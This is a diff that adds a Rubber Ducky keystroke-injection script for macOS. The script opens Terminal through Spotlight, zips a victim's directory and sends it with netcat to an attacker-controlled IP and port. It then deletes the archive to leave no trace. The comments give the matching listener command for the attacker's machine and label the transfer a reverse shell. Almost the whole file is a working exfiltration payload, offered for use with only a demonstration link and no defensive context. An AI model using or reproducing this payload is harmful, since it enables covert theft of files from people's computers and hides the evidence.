@@ -1,0 +1,32 @@
+REM Sending files to another device using reverse shell
+REM On attacker device, you'll need to open terminal, type 'nc -l [PORT] > [anyfilename]'
+
+REM Demonstration: https://www.youtube.com/watch?v=Zp1_zhC8j9o
+
+REM Open spotlight search
+DELAY   1000
+GUI     SPACE
+DELAY   1000
+
+REM Open terminal from spotlight search
+STRING  terminal
+ENTER
+DELAY   500
+
+REM Compress target directory (called Important-Files here)
+STRING  zip -r victimfiles.zip Important-Files -x Important-Files/.*
+ENTER
+DELAY   8000
+
+REM Start reverse shell with ATTACKER'S IP ADDRESS and PORT and send victimfiles.zip
+STRING  nc [IP-ADDRESS] [PORT] < victimfiles.zip
+ENTER
+DELAY   300000
+
+REM Delete compressed file off victim computer to leave no trace
+STRING  rm victimfiles.zip
+ENTER
+DELAY   1000
+
+REM Quit terminal
+GUI     q
